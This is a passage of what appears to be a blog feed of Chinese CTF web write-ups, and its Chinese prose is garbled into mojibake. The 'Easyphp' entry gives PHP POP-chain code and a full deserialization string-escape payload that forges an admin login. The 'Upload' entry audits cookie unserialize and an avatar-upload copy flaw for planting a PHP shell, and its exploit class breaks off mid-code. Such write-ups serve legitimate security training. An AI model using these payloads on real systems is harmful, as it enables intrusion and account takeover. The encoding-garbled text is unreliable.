<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;<span class="comment">//æ ¸éªŒæ— è¯¯ï¼Œè®°å½•ç™»å½•token</span></span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦åˆ©ç”¨è¿™ä¸ªâ€œåé—¨â€ï¼Œè·å–adminæƒé™</p><h4><span id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>unserialize($this-&gt;getNewinfo());</strong>    åˆ©ç”¨åºåˆ—åŒ–ä¼ é€’å®ä½“ç±»ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ<code>Info</code>ç±»çš„å®ä¾‹ï¼Œå¹¶<strong>åºåˆ—åŒ–ä¼ é€’</strong></p><p>safe æ£€æµ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›¿æ¢â€¦â€¦å¦‚æœå¯ä»¥æ„å»º<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong>ï¼Œé‚£åºåˆ—åŒ–å­—ç¬¦ä¸²å°†æ˜¯ä¸å®‰å…¨çš„</p><p>æ‰¾ä¸€ä¸‹é­”æ³•æ–¹æ³•ï¼š</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827221951009.png" alt="image-20210827221951009"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: destruct</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¼¼ä¹æ˜¯ä¸€ä¸ªç‚¹ï¼Œä½†ä¸å®Œå…¨æ˜¯â€¦â€¦å› ä¸ºè¢«è¿‡æ»¤äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UpdateHelper: destruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; tostring</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Info: call</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è°ƒä¸€ä¸ªloginæ–¹æ³•ï¼Œloginæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æ•°æ®å±‚çš„ä¸€ä¸ªæ˜¯ç”¨æˆ·ç±»çš„</p><p>æ›´åº•å±‚çš„æ•°æ®æ“ä½œçš„sqlè¯­å¥æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸€ä¸ª<strong>æ’å¯¹</strong>çš„è¯­å¥è¿”å›trueçš„<code>id</code>ç»“æœé›†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,2;</span><br><span class="line">_ _ _ _ _ _ _ _</span><br><span class="line">|id|password |</span><br><span class="line">|1|2        |</span><br></pre></td></tr></table></figure><p>ç”±äºå¯†ç æ˜¯md5çš„éªŒè¯</p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶passwordä¸º1ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ§åˆ¶tokenä¸ºadminå³å¯</p><p>popï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">&quot;select 1,\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; from user where username=?&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>è·å–åºåˆ—åŒ–å¯¹è±¡å¤„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸæœ¬çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;1</span><br><span class="line"></span><br><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>åœ¨nicknameå¤„æ„å»ºé€ƒé€¸</p><p>å¯¹è±¡æ•°æ®æ”¾åœ¨<code>CtrlCase</code>ä¸­</p><p><img src="/images/GYCTF2020-Easyphp/image-20210828000602366.png" alt="image-20210828000602366"></p><p>ç¬¦åˆæ„å»ºæ ‡å‡†åï¼Œå¤šä½™å­—ç¬¦è¢«åºŸå¼ƒ</p><p>æ„å»º payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;****************************************************unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>å›æ˜¾åï¼Œç™»å½•<code>admin</code>è´¦å·</p><p>indexï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sessionå·²è®¾ç½®ï¼Œç›´æ¥è½¬åˆ°updataåŒ…å«è¯»å–flagï¼š</p><img src="/images/GYCTF2020-Easyphp/image-20210827234558705.png" alt="image-20210827234558705" style="zoom:80%;">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;æ–‡ä»¶æ³„éœ²ã€ä»£ç å®¡è®¡ã€ååºåˆ—åŒ–&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯-2019-Upload</title>
    <link href="http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/"/>
    <id>http://example.com/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/</id>
    <published>2021-08-26T13:04:24.781Z</published>
    <updated>2021-08-29T11:30:32.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ã€ååºåˆ—åŒ–ã€æ–‡ä»¶æ³„éœ²</p><a id="more"></a></blockquote><div class="toc"><!-- toc --><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2">æ–‡ä»¶æ³„éœ²</a></li><li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">ä»£ç å®¡è®¡</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">æ–‡ä»¶ä¸Šä¼ </a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ååºåˆ—åŒ–</a></li></ul><!-- tocstop --></div><br><p>é¦–å…ˆæ˜¯æ³¨å†Œä¸ç™»å½•ï¼Œç™»é™†åï¼Œæ¯ä¸ªè´¦æˆ·å¯ä»¥ä¸Šä¼ ä¸€å¼ å¤´åƒã€‚</p><p>å­˜åœ¨uploadæ–‡ä»¶å¤¹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¤´åƒæ–‡ä»¶è¢«é‡å‘½åä¸”æ‹¼æ¥è§£æä¸º<code>.png</code></p><h4><span id="æ–‡ä»¶æ³„éœ²">æ–‡ä»¶æ³„éœ²</span></h4><p>é‰´äºç›®å‰çš„æƒ…å†µâ€¦â€¦æ¯”è¾ƒå›°éš¾ï¼Œå¯¹å­—å…¸ã€çº¿ç¨‹ã€é—´éš”æ—¶é—´çš„è®¾ç½®æœ‰è¾ƒé«˜çš„è¦æ±‚â€¦â€¦</p><p>å°è¯•å¥½å¤šæ­é…ï¼ŒæˆåŠŸä¸¤æ¬¡ï¼ŒæŒºç„å¦™çš„â€¦â€¦</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211255110.png" alt="image-20210826211255110"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211301886.png" alt="image-20210826211301886"></p><h4><span id="ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</span></h4><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826211351430.png" alt="image-20210826211351430"></p><p>mvc</p><p>æŠ“åŒ…æµ‹è¯•æ—¶ï¼Œcookie ä¸­æœ‰ä¸€ä¸ª userã€‚base64åçš„åºåˆ—åŒ–æ•°æ®</p><p>è¿™ä¸ªåºåˆ—åŒ–æ˜¯ç”¨æ¥æ£€æŸ¥ç™»å½•çŠ¶æ€çš„ï¼š</p><p>index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªååºåˆ—åŒ–ç‚¹æ„é€ æ”»å‡»</p><h4><span id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </span></h4><p>å†æ¥çœ‹çœ‹ä¸ªäººä¿¡æ¯çš„å¤´åƒä¸Šä¼ ï¼š</p><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå‚æ•°å¯æ§ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶å‚æ•°ç»•è¿‡æ–‡ä»¶åæ‹¼æ¥ï¼Œå€ŸåŠ©<code>copy</code>å°†æˆ‘ä»¬ç»•è¿‡ä¸Šä¼ çš„å›¾ç‰‡shellæ›´æ”¹ä¸ºphpè§£æ</p><p>æ„å»ºpopé“¾éœ€è¦å…¥å£</p><h4><span id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</span></h4><p>webåº”ç”¨ä¸­çš„é­”æ³•æ–¹æ³•ï¼š</p><img src="/images/å¼ºç½‘æ¯-2019-Upload/image-20210826232551939.png" alt="image-20210826232551939" style="zoom:80%;"><p>åªæœ‰destructå¯ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨indexæ–¹æ³•ï¼Œå¯ä»¥call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶<code>name</code>ï¼Œå°±å¯ä»¥è°ƒç”¨æ–‡ä»¶ä¸Šä¼ </p><p>ä¸Šé¢å°±æœ‰ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å¯æ§</p><p>popï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Profile</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checker</span>;</span><br><span class="line">        <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">        <span class="keyword">public</span> $filename;</span><br><span class="line">        <span class="keyword">public</span> $upload_menu;</span><br><span class="line">        <span class="keyword">public</span> $ext;</span><br><span 